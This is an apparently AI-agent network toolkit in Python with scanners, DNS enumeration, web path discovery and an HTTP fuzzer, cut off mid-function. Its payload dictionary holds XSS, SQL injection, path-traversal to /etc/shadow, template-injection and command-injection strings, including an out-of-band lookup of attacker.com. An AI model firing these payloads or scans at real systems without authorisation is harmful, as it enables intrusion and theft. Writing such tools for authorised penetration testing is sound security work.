import asyncio
import socket
import subprocess
import sys
import struct
import time
import urllib.request
import urllib.error
import urllib.parse
import ssl
import json
import re
import hashlib
import base64
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import psutil

IS_WIN = sys.platform == "win32"

COMMON_SERVICE_PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 111: "rpcbind", 119: "nntp", 123: "ntp",
    135: "msrpc", 139: "netbios-ssn", 143: "imap", 161: "snmp",
    194: "irc", 389: "ldap", 443: "https", 445: "microsoft-ds",
    465: "smtps", 514: "syslog", 587: "submission", 636: "ldaps",
    993: "imaps", 995: "pop3s", 1080: "socks", 1433: "mssql",
    1521: "oracle", 2049: "nfs", 2181: "zookeeper", 2375: "docker",
    2376: "docker-tls", 3000: "http-alt", 3306: "mysql", 3389: "rdp",
    4444: "metasploit", 4848: "glassfish", 5000: "upnp", 5432: "postgresql",
    5672: "amqp", 5900: "vnc", 5985: "winrm-http", 5986: "winrm-https",
    6379: "redis", 6443: "k8s-api", 7001: "weblogic", 8000: "http-alt",
    8080: "http-proxy", 8443: "https-alt", 8888: "jupyter", 9000: "php-fpm",
    9090: "prometheus", 9200: "elasticsearch", 9300: "elasticsearch-cluster",
    11211: "memcached", 15672: "rabbitmq-mgmt", 27017: "mongodb",
    27018: "mongodb", 50000: "db2", 50070: "hadoop-namenode",
}

WHOIS_SERVERS = {
    "com": "whois.verisign-grs.com", "net": "whois.verisign-grs.com",
    "org": "whois.pir.org", "info": "whois.afilias.net",
    "io": "whois.nic.io", "co": "whois.nic.co",
    "us": "whois.nic.us", "uk": "whois.nic.uk",
    "de": "whois.denic.de", "fr": "whois.afnic.fr",
    "nl": "whois.domain-registry.nl", "ru": "whois.tcinet.ru",
    "cn": "whois.cnnic.cn", "jp": "whois.jprs.jp",
    "au": "whois.auda.org.au", "br": "whois.registro.br",
    "ca": "whois.cira.ca", "eu": "whois.eu",
    "biz": "whois.biz", "name": "whois.nic.name",
    "mobi": "whois.dotmobiregistry.net", "pro": "whois.registrypro.pro",
    "tv": "whois.nic.tv", "cc": "whois.nic.cc",
    "ws": "whois.website.ws", "me": "whois.nic.me",
    "ly": "whois.nic.ly", "to": "whois.tonic.to",
    "in": "whois.registry.in", "be": "whois.dns.be",
    "pl": "whois.dns.pl",
}

DNS_RECORD_TYPES = {
    1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR",
    15: "MX", 16: "TXT", 28: "AAAA", 33: "SRV", 255: "ANY",
}

NET_TOOLS = [
    {
        "name": "net_connections",
        "description": (
            "List active TCP/UDP connections with process names, addresses, state. "
            "Filter by state (ESTABLISHED, LISTEN, TIME_WAIT, CLOSE_WAIT) or process name. "
            "To see what is listening: use state_filter='LISTEN'."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "state_filter": {"type": "string", "description": "ESTABLISHED | LISTEN | TIME_WAIT | CLOSE_WAIT | all"},
                "process_filter": {"type": "string", "description": "Partial process name match."}
            }
        }
    },
    {
        "name": "net_ping",
        "description": (
            "Ping a host using ICMP. Returns min/avg/max/jitter latency and packet loss. "
            "Sends pings concurrently for speed. Falls back to system ping if no raw socket permission."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "count": {"type": "integer", "default": 4},
                "timeout": {"type": "integer", "description": "Per-ping timeout seconds. Default 2.", "default": 2}
            },
            "required": ["host"]
        }
    },
    {
        "name": "net_dns_lookup",
        "description": (
            "Fast DNS resolution with full record type support: A, AAAA, MX, NS, TXT, CNAME, SOA, PTR, SRV. "
            "Uses raw DNS protocol with configurable timeout. Supports custom DNS server. "
            "For reverse lookup pass an IP address. Much faster than system resolver."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Hostname or IP address"},
                "record_types": {
                    "type": "array",
                    "items": {"type": "string", "enum": ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR", "SRV"]},
                    "description": "Record types to query. Default: ['A', 'AAAA', 'MX', 'NS', 'TXT']"
                },
                "dns_server": {"type": "string", "description": "DNS server IP to use. Default: 8.8.8.8"},
                "timeout": {"type": "number", "description": "Query timeout seconds. Default 3.", "default": 3}
            },
            "required": ["host"]
        }
    },
    {
        "name": "net_http_request",
        "description": (
            "Make HTTP/HTTPS request. Returns status, headers, body, timing. "
            "Supports GET, POST, PUT, DELETE, HEAD, PATCH, OPTIONS. "
            "Set follow_redirects=false to capture redirect chain. "
            "Set verify_ssl=false for self-signed certs. "
            "Set basic_auth={'user':'x','pass':'y'} for Basic auth."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "HEAD", "PATCH", "OPTIONS"], "default": "GET"},
                "headers": {"type": "object"},
                "body": {"type": "string"},
                "timeout": {"type": "integer", "default": 15},
                "max_response_kb": {"type": "integer", "description": "Truncate response body at N KB. Default 256.", "default": 256},
                "verify_ssl": {"type": "boolean", "default": True},
                "follow_redirects": {"type": "boolean", "default": True},
                "basic_auth": {
                    "type": "object",
                    "properties": {
                        "user": {"type": "string"},
                        "pass": {"type": "string"}
                    }
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "net_interfaces",
        "description": "List all network interfaces: IP, MAC, speed, traffic counters. Shows which are up/down.",
        "schema": {"type": "object", "properties": {}}
    },
    {
        "name": "net_traceroute",
        "description": (
            "Trace route to a host. Returns structured per-hop data with latency. "
            "Parses output into hop list with RTT values."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "max_hops": {"type": "integer", "default": 20},
                "timeout": {"type": "integer", "default": 45}
            },
            "required": ["host"]
        }
    },
    {
        "name": "net_port_scan",
        "description": (
            "Scan TCP ports on a host. Fast parallel scanner with service identification and banner grabbing. "
            "Accepts individual ports or ranges. Concurrency default 300. "
            "grab_banners=true captures service version strings (slower). "
            "Use timeout=0.5 for LAN, timeout=2 for internet hosts."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "ports": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "description": "Specific ports. e.g. [22, 80, 443, 3389, 8080]"
                },
                "port_range": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "minItems": 2,
                    "maxItems": 2,
                    "description": "Inclusive range [start, end]. e.g. [1, 1024]"
                },
                "timeout": {"type": "number", "description": "Per-port timeout seconds. Default 1.0.", "default": 1.0},
                "concurrency": {"type": "integer", "description": "Parallel connections. Default 300.", "default": 300},
                "grab_banners": {"type": "boolean", "description": "Grab service banners from open ports. Default false.", "default": False}
            },
            "required": ["host"]
        }
    },
    {
        "name": "net_whois",
        "description": (
            "Get WHOIS information for a domain or IP. "
            "Uses TLD-specific WHOIS servers for accurate results. "
            "For IPs queries regional RIR databases (ARIN, RIPE, APNIC, etc). "
            "Returns registrar, owner, dates, nameservers, ASN."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Domain name or IP address"}
            },
            "required": ["target"]
        }
    },
    {
        "name": "net_ssl_info",
        "description": (
            "Inspect SSL/TLS certificate for a host. Returns: subject, issuer, SANs, validity dates, "
            "serial number, fingerprint, protocol version, cipher suite. "
            "Detects expired, self-signed, and wildcard certs. "
            "Useful for pentest: check misconfigurations, weak ciphers, cert transparency."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer", "default": 443},
                "timeout": {"type": "number", "default": 10}
            },
            "required": ["host"]
        }
    },
    {
        "name": "net_banner_grab",
        "description": (
            "Connect to a TCP port and grab the service banner. "
            "Sends optional probe string and returns raw response. "
            "Useful for identifying service versions, OS fingerprinting, pentest enumeration."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "port": {"type": "integer"},
                "probe": {"type": "string", "description": "Optional string to send. Default: empty (passive grab)."},
                "timeout": {"type": "number", "default": 5},
                "read_bytes": {"type": "integer", "default": 1024}
            },
            "required": ["host", "port"]
        }
    },
    {
        "name": "net_http_headers_audit",
        "description": (
            "Audit HTTP security headers for a web host. "
            "Checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, "
            "Permissions-Policy, CORS misconfig, server version disclosure, cookie flags. "
            "Returns pass/fail/warn per header with remediation advice. "
            "Essential for web pentest and hardening."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "timeout": {"type": "integer", "default": 10}
            },
            "required": ["url"]
        }
    },
    {
        "name": "net_http_dir_scan",
        "description": (
            "Scan for common web paths and files on a web server. "
            "Checks for admin panels, config files, backups, API endpoints, git repos, "
            "sensitive files (.env, web.config, robots.txt, sitemap.xml, phpinfo, etc). "
            "Returns found paths with status codes. Core web pentest recon tool."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "base_url": {"type": "string", "description": "Base URL e.g. https://example.com"},
                "wordlist": {
                    "type": "string",
                    "enum": ["common", "extended", "api"],
                    "description": "Path list: common (~80 paths), extended (~200), api (~60 API endpoints). Default: common.",
                    "default": "common"
                },
                "timeout": {"type": "number", "default": 5},
                "concurrency": {"type": "integer", "default": 20},
                "filter_codes": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "description": "Only return these HTTP status codes. Default: [200, 201, 204, 301, 302, 403, 500]"
                }
            },
            "required": ["base_url"]
        }
    },
    {
        "name": "net_subnet_scan",
        "description": (
            "Discover live hosts in a subnet using TCP connect and ICMP. "
            "Accepts CIDR notation (e.g. 192.168.1.0/24). "
            "For each live host optionally scans common ports. "
            "Returns list of responding hosts with open ports. LAN recon tool."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "cidr": {"type": "string", "description": "Network in CIDR notation e.g. 192.168.1.0/24"},
                "timeout": {"type": "number", "default": 0.5},
                "concurrency": {"type": "integer", "default": 254},
                "scan_ports": {
                    "type": "array",
                    "items": {"type": "integer"},
                    "description": "Ports to check on discovered hosts. Default: [22, 80, 443, 445, 3389, 8080]"
                }
            },
            "required": ["cidr"]
        }
    },
    {
        "name": "net_fuzzer",
        "description": (
            "HTTP parameter and header fuzzer for pentest. "
            "Injects payloads into URL parameters, POST body, or headers. "
            "Detects anomalies in response length, status code, time. "
            "Payload sets: xss, sqli, path_traversal, ssti, cmdi, generic. "
            "Returns responses that differ from baseline."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                "parameter": {"type": "string", "description": "Parameter name to fuzz (URL param or POST body key)"},
                "header": {"type": "string", "description": "Header name to fuzz instead of parameter"},
                "payload_set": {
                    "type": "string",
                    "enum": ["xss", "sqli", "path_traversal", "ssti", "cmdi", "generic"],
                    "default": "generic"
                },
                "custom_payloads": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Custom payload list. Overrides payload_set if provided."
                },
                "timeout": {"type": "number", "default": 8},
                "baseline_param_value": {"type": "string", "description": "Baseline value for comparison. Default: 'test'", "default": "test"}
            },
            "required": ["url"]
        }
    },
    {
        "name": "net_tech_fingerprint",
        "description": (
            "Fingerprint web technologies on a target URL. "
            "Detects: web server, frameworks, CMS, CDN, WAF, analytics, JS libraries, "
            "programming language, database hints. "
            "Analyzes headers, HTML, cookies, response patterns. "
            "Essential for pentest recon and attack surface mapping."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "timeout": {"type": "integer", "default": 10}
            },
            "required": ["url"]
        }
    },
    {
        "name": "net_dns_zone_enum",
        "description": (
            "DNS enumeration: subdomain discovery via brute-force wordlist + DNS record scraping. "
            "Also checks: zone transfer (AXFR), DNSSEC, wildcard detection, SPF/DMARC/DKIM records. "
            "Returns discovered subdomains with IPs. Key pentest recon tool."
        ),
        "schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string"},
                "wordlist": {
                    "type": "string",
                    "enum": ["small", "medium"],
                    "description": "small (~100 subdomains), medium (~500). Default: small.",
                    "default": "small"
                },
                "dns_server": {"type": "string", "description": "DNS server to use. Default: 8.8.8.8"},
                "concurrency": {"type": "integer", "default": 50},
                "timeout": {"type": "number", "default": 2},
                "check_zone_transfer": {"type": "boolean", "default": True},
                "check_email_security": {"type": "boolean", "description": "Check SPF, DMARC, DKIM. Default true.", "default": True}
            },
            "required": ["domain"]
        }
    },
]

COMMON_PATHS = {
    "common": [
        "/", "/admin", "/admin/", "/login", "/wp-admin", "/wp-login.php",
        "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/.env.production",
        "/robots.txt", "/sitemap.xml", "/favicon.ico", "/crossdomain.xml",
        "/phpinfo.php", "/info.php", "/test.php", "/index.php",
        "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql", "/database.sql",
        "/config.php", "/config.json", "/config.yml", "/config.yaml",
        "/web.config", "/appsettings.json", "/.htaccess", "/server-status",
        "/server-info", "/.DS_Store", "/Thumbs.db", "/WEB-INF/web.xml",
        "/actuator", "/actuator/health", "/actuator/env", "/actuator/mappings",
        "/console", "/h2-console", "/phpmyadmin", "/pma", "/adminer.php",
        "/swagger-ui.html", "/swagger-ui/", "/api-docs", "/openapi.json",
        "/graphql", "/graphiql", "/__graphql", "/v1/graphql",
        "/api/v1/", "/api/v2/", "/api/", "/rest/",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/metrics", "/health", "/healthz", "/status", "/ping",
        "/debug", "/trace", "/heap", "/dump",
        "/composer.json", "/package.json", "/Gemfile", "/requirements.txt",
        "/Dockerfile", "/docker-compose.yml", "/.travis.yml", "/.github/",
        "/wp-content/uploads/", "/uploads/", "/files/", "/static/",
        "/private/", "/secret/", "/credentials/", "/keys/",
        "/cgi-bin/", "/cgi-bin/admin.cgi", "/shell.php", "/cmd.php",
    ],
    "extended": [],
    "api": [
        "/api/v1/users", "/api/v1/admin", "/api/v1/config", "/api/v1/keys",
        "/api/v1/token", "/api/v1/auth", "/api/v1/login", "/api/v1/register",
        "/api/v2/users", "/api/v2/admin", "/api/v2/config",
        "/api/swagger.json", "/api/swagger.yaml", "/api/openapi.yaml",
        "/api/graphql", "/api/health", "/api/status", "/api/version",
        "/v1/", "/v2/", "/v3/",
        "/rest/v1/", "/rest/api/",
        "/oauth/token", "/oauth/authorize", "/oauth2/token",
        "/auth/token", "/auth/login", "/auth/refresh",
        "/.well-known/oauth-authorization-server",
        "/api/internal/", "/api/private/", "/api/debug/",
        "/api/admin/users", "/api/admin/settings",
        "/api/keys", "/api/secrets", "/api/env",
    ]
}

FUZZER_PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
        "'\"><img src=x onerror=alert(document.domain)>",
        "{{7*7}}",
        "${7*7}",
    ],
    "sqli": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND SLEEP(3)--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "path_traversal": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/shadow",
        "..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%2fetc%2fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "/etc/passwd",
        "C:\\windows\\win.ini",
    ],
    "ssti": [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    ],
    "cmdi": [
        ";id",
        "|id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "&&whoami",
        ";sleep 5",
        "||sleep 5",
        "&& sleep 5 &&",
        "|nslookup attacker.com",
    ],
    "generic": [
        "test",
        "",
        "null",
        "undefined",
        "0",
        "-1",
        "9999999",
        "'",
        "\"",
        "<",
        ">",
        "%00",
        "%0a",
        "\\",
        "../",
    ],
}

SUBDOMAIN_WORDLIST_SMALL = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
    "vpn", "mx", "mail2", "email", "remote", "blog", "webdisk", "pop3", "imap",
    "dev", "staging", "test", "api", "cdn", "portal", "admin", "secure", "m",
    "mobile", "shop", "store", "app", "web", "static", "media", "img", "images",
    "upload", "uploads", "download", "downloads", "files", "docs", "support",
    "help", "forum", "news", "old", "new", "beta", "alpha", "demo", "sandbox",
    "git", "gitlab", "github", "jenkins", "ci", "jira", "confluence", "wiki",
    "db", "database", "mysql", "postgres", "redis", "mongo", "elastic",
    "internal", "intranet", "corp", "office", "backup", "monitor", "grafana",
    "prometheus", "kibana", "dashboard", "panel", "cpanel", "whm", "plesk",
    "autodiscover", "autoconfig", "cal", "calendar", "crm", "erp", "sso",
    "auth", "oauth", "login", "accounts", "id", "identity", "v1", "v2",
    "v3", "uat", "qa", "pre-prod", "production", "prod",
]

SUBDOMAIN_WORDLIST_MEDIUM = SUBDOMAIN_WORDLIST_SMALL + [
    "ns3", "ns4", "ns5", "mx1", "mx2", "smtp2", "relay", "mail3",
    "webconf", "conference", "meet", "video", "stream", "broadcast",
    "assets", "resources", "data", "reports", "analytics", "stats",
    "proxy", "gateway", "firewall", "dmz", "bastion", "jump",
    "ssh", "rdp", "citrix", "vnc", "terminal",
    "storage", "backup2", "dr", "disaster-recovery",
    "node1", "node2", "server1", "server2", "web1", "web2",
    "lb", "load-balancer", "balancer", "cluster",
    "sandbox2", "dev2", "dev3", "staging2", "test2",
    "uat2", "qa2", "rc", "release",
    "customer", "clients", "partner", "partners", "reseller",
    "billing", "payment", "pay", "checkout", "cart",
    "feed", "rss", "atom", "api2", "api3", "graphql",
    "socket", "websocket", "push", "notify", "notification",
    "grpc", "thrift", "kafka", "rabbit", "mq",
    "collector", "ingest", "pipeline", "etl",
    "vault", "secrets", "config", "registry",
    "helm", "k8s", "kubernetes", "docker", "container",
    "logs", "logging", "audit", "siem",
    "scanner", "security", "pentest", "waf",
    "mail4", "mail5", "exchange", "ews", "owa",
    "vpn2", "remote2", "access", "connect",
    "ftp2", "sftp", "ftps",
]


def _decode(raw: bytes) -> str:
    for enc in ["utf-8", "cp1251", "cp866", "latin-1"]:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", errors="replace")


def _run_subprocess(cmd: list, timeout: int) -> tuple[bool, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        out = _decode(r.stdout) + _decode(r.stderr)
        return r.returncode == 0, out
    except subprocess.TimeoutExpired:
        return False, f"Timed out after {timeout}s"
    except FileNotFoundError:
        return False, f"Command not found: {cmd[0]}"
    except Exception as e:
        return False, str(e)


def _build_dns_query(name: str, qtype: int) -> bytes:
    msg_id = 0x1234
    flags = 0x0100
    header = struct.pack("!HHHHHH", msg_id, flags, 1, 0, 0, 0)
    qname = b""
    for label in name.rstrip(".").split("."):
        encoded = label.encode("ascii")
        qname += bytes([len(encoded)]) + encoded
    qname += b"\x00"
    question = qname + struct.pack("!HH", qtype, 1)
    return header + question


def _parse_dns_name(data: bytes, offset: int) -> tuple[str, int]:
    labels = []
    visited = set()
    while offset < len(data):
        if offset in visited:
            break
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            if offset + 1 >= len(data):
                break
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            name, _ = _parse_dns_name(data, ptr)
            labels.append(name)
            offset += 2
            break
        else:
            offset += 1
            labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
            offset += length
    return ".".join(labels), offset


def _parse_dns_response(data: bytes, qtype: int) -> list[str]:
    if len(data) < 12:
        return []
    ancount = struct.unpack("!H", data[6:8])[0]
    offset = 12
    for _ in range(struct.unpack("!H", data[4:6])[0]):
        _, offset = _parse_dns_name(data, offset)
        offset += 4
    results = []
    for _ in range(ancount):
        if offset >= len(data):
            break
        _, offset = _parse_dns_name(data, offset)
        if offset + 10 > len(data):
            break
        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", data[offset:offset + 10])
        offset += 10
        rdata = data[offset:offset + rdlength]
        offset += rdlength
        if rtype == 1 and len(rdata) == 4:
            results.append(socket.inet_ntoa(rdata))
        elif rtype == 28 and len(rdata) == 16:
            results.append(socket.inet_ntop(socket.AF_INET6, rdata))
        elif rtype in (2, 5, 12):
            name, _ = _parse_dns_name(data, offset - rdlength)
            results.append(name)
        elif rtype == 15:
            if len(rdata) >= 3:
                pref = struct.unpack("!H", rdata[:2])[0]
                exch, _ = _parse_dns_name(data, offset - rdlength + 2)
                results.append(f"{pref} {exch}")
        elif rtype == 16:
            txt_offset = 0
            parts = []
            while txt_offset < len(rdata):
                l = rdata[txt_offset]
                txt_offset += 1
                parts.append(rdata[txt_offset:txt_offset + l].decode("utf-8", errors="replace"))
                txt_offset += l
            results.append(" ".join(parts))
        elif rtype == 6:
            results.append(f"SOA rdlength={rdlength}")
        elif rtype == 33:
            if len(rdata) >= 6:
                priority, weight, port = struct.unpack("!HHH", rdata[:6])
                target, _ = _parse_dns_name(data, offset - rdlength + 6)
                results.append(f"{priority} {weight} {port} {target}")
    return results


def _dns_query_raw(name: str, qtype: int, server: str = "8.8.8.8", timeout: float = 3) -> list[str]:
    try:
        query = _build_dns_query(name, qtype)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(query, (server, 53))
            data, _ = sock.recvfrom(4096)
        return _parse_dns_response(data, qtype)
    except Exception:
        return []


def _dns_query_tcp(name: str, qtype: int, server: str = "8.8.8.8", timeout: float = 5) -> list[str]:
    try:
        query = _build_dns_query(name, qtype)
        msg = struct.pack("!H", len(query)) + query
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((server, 53))
            sock.sendall(msg)
            length_data = sock.recv(2)
            if len(length_data) < 2:
                return []
            length = struct.unpack("!H", length_data)[0]
            data = b""
            while len(data) < length:
                chunk = sock.recv(length - len(data))
                if not chunk:
                    break
                data += chunk
        return _parse_dns_response(data, qtype)
    except Exception:
        return []


def _icmp_ping_one(ip: str, seq: int, timeout: float) -> float | None:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(timeout)
        ident = seq & 0xFFFF
        header = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
        payload = b"abcdefghijklmnop"
        data = header + payload
        checksum = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
            checksum += w
        checksum = ~((checksum >> 16) + (checksum & 0xFFFF)) & 0xFFFF
        header = struct.pack("!BBHHH", 8, 0, checksum, ident, seq)
        packet = header + payload
        t0 = time.monotonic()
        sock.sendto(packet, (ip, 0))
        sock.recv(1024)
        return (time.monotonic() - t0) * 1000
    except PermissionError:
        return None
    except Exception:
        return None
    finally:
        try:
            sock.close()
        except Exception:
            pass


def _parse_traceroute_output(output: str, is_win: bool) -> list[dict]:
    hops = []
    for line in output.splitlines():
        line = line.strip()
        if not line:
            continue
        if is_win:
            m = re.match(r"^\s*(\d+)\s+([\d<*]+\s+ms\s+[\d<*]+\s+ms\s+[\d<*]+\s+ms|Request timed out)", line)
            if m:
                hop_num = int(m.group(1))
                if "timed out" in line.lower():
                    hops.append({"hop": hop_num, "host": "*", "rtt_ms": None})
                else:
                    rtts = re.findall(r"(\d+)\s+ms", line)
                    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", line)
                    avg = round(sum(int(x) for x in rtts) / len(rtts), 2) if rtts else None
                    hops.append({"hop": hop_num, "host": ips[0] if ips else "*", "rtt_ms": avg})
        else:
            m = re.match(r"^\s*(\d+)\s+", line)
            if m:
                hop_num = int(m.group(1))
                if "* * *" in line or "!N" in line or "!H" in line:
                    hops.append({"hop": hop_num, "host": "*", "rtt_ms": None})
                else:
                    rtts = re.findall(r"([\d.]+)\s+ms", line)
                    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", line)
                    hostnames = re.findall(r"([a-zA-Z][a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,})", line)
                    avg = round(sum(float(x) for x in rtts) / len(rtts), 2) if rtts else None
                    host = ips[0] if ips else (hostnames[0] if hostnames else "*")
                    hops.append({"hop": hop_num, "host": host, "rtt_ms": avg})
    return hops


def _get_whois_server_for_ip(ip: str) -> str:
    try:
        addr = ipaddress.ip_address(ip)
        first_octet = int(str(addr).split(".")[0]) if addr.version == 4 else None
        if addr.version == 6:
            return "whois.arin.net"
        if first_octet is None:
            return "whois.arin.net"
        if first_octet in range(1, 128):
            return "whois.arin.net"
        if first_octet in range(128, 192):
            return "whois.ripe.net"
        if first_octet in range(192, 224):
            return "whois.apnic.net"
        return "whois.arin.net"
    except Exception:
        return "whois.arin.net"


class NetworkTools:

    async def _connections(self, args: dict) -> dict:
        state_f = args.get("state_filter", "").upper()
        proc_f = args.get("process_filter", "").lower()
        loop = asyncio.get_event_loop()

        def collect():
            pid_to_name = {p.pid: p.info["name"] for p in psutil.process_iter(["pid", "name"])}
            result = []
            for c in psutil.net_connections(kind="inet"):
                if state_f and state_f != "ALL" and c.status != state_f:
                    continue
                pname = pid_to_name.get(c.pid, "") if c.pid else ""
                if proc_f and proc_f not in pname.lower():
                    continue
                result.append({
                    "pid": c.pid,
                    "process": pname,
                    "type": "TCP" if c.type.name == "SOCK_STREAM" else "UDP",
                    "local": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                    "remote": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                    "status": c.status,
                })
            return result

        conns = await loop.run_in_executor(None, collect)
        return {"connections": conns, "count": len(conns)}

    async def _ping(self, args: dict) -> dict:
        host = args["host"]
        count = args.get("count", 4)
        timeout = args.get("timeout", 2)
        loop = asyncio.get_event_loop()

        try:
            ip = await loop.run_in_executor(None, lambda: socket.gethostbyname(host))
        except Exception as e:
            return {"host": host, "error": f"DNS resolution failed: {e}", "success": False}

        def do_icmp_concurrent():
            with ThreadPoolExecutor(max_workers=count) as ex:
                futures = [ex.submit(_icmp_ping_one, ip, i, float(timeout)) for i in range(count)]
                return [f.result() for f in futures]

        rtts_raw = await loop.run_in_executor(None, do_icmp_concurrent)
        rtts = [r for r in rtts_raw if r is not None]

        if rtts:
            jitter = round(max(rtts) - min(rtts), 2) if len(rtts) > 1 else 0.0
            return {
                "host": host,
                "ip": ip,
                "sent": count,
                "received": len(rtts),
                "loss_pct": round((count - len(rtts)) / count * 100, 1),
                "rtt_min_ms": round(min(rtts), 2),
                "rtt_avg_ms": round(sum(rtts) / len(rtts), 2),
                "rtt_max_ms": round(max(rtts), 2),
                "jitter_ms": jitter,
                "success": True,
            }

        if IS_WIN:
            cmd = ["ping", "-n", str(count), "-w", str(timeout * 1000), host]
        else:
            cmd = ["ping", "-c", str(count), "-W", str(timeout), host]
        ok, output = await loop.run_in_executor(
            None, lambda: _run_subprocess(cmd, timeout * count + 5)
        )
        return {"host": host, "ip": ip, "output": output, "success": ok}

    async def _dns_lookup(self, args: dict) -> dict:
        host = args["host"]
        dns_server = args.get("dns_server", "8.8.8.8")
        timeout = float(args.get("timeout", 3))
        requested_types = args.get("record_types", ["A", "AAAA", "MX", "NS", "TXT"])

        type_map = {"A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "PTR": 12,
                    "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33}

        is_ip = False
        try:
            ipaddress.ip_address(host)
            is_ip = True
        except ValueError:
            pass

        if is_ip:
            parts = host.split(".")
            ptr_name = ".".join(reversed(parts)) + ".in-addr.arpa"
            loop = asyncio.get_event_loop()
            results = await loop.run_in_executor(
                None, lambda: _dns_query_raw(ptr_name, 12, dns_server, timeout)
            )
            return {"host": host, "type": "PTR", "records": results, "dns_server": dns_server}

        loop = asyncio.get_event_loop()

        async def query_type(rtype_name: str) -> tuple[str, list[str]]:
            qtype = type_map.get(rtype_name.upper())
            if qtype is None:
                return rtype_name, []
            records = await loop.run_in_executor(
                None, lambda: _dns_query_raw(host, qtype, dns_server, timeout)
            )
            return rtype_name, records

        tasks = [query_type(t) for t in requested_types]
        results_pairs = await asyncio.gather(*tasks)

        records = {k: v for k, v in results_pairs if v}
        return {
            "host": host,
            "dns_server": dns_server,
            "records": records,
        }

    async def _http_request(self, args: dict) -> dict:
        url = args["url"]
        method = args.get("method", "GET").upper()
        headers = dict(args.get("headers") or {})
        body = args.get("body")
        timeout = args.get("timeout", 15)
        max_bytes = args.get("max_response_kb", 256) * 1024
        verify = args.get("verify_ssl", True)
        follow = args.get("follow_redirects", True)
        basic_auth = args.get("basic_auth")

        if basic_auth:
            creds = base64.b64encode(
                f"{basic_auth.get('user', '')}:{basic_auth.get('pass', '')}".encode()
            ).decode()
            headers["Authorization"] = f"Basic {creds}"

        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        loop = asyncio.get_event_loop()

        def do_request():
            data = body.encode() if body else None
            req = urllib.request.Request(url, data=data, headers=headers, method=method)
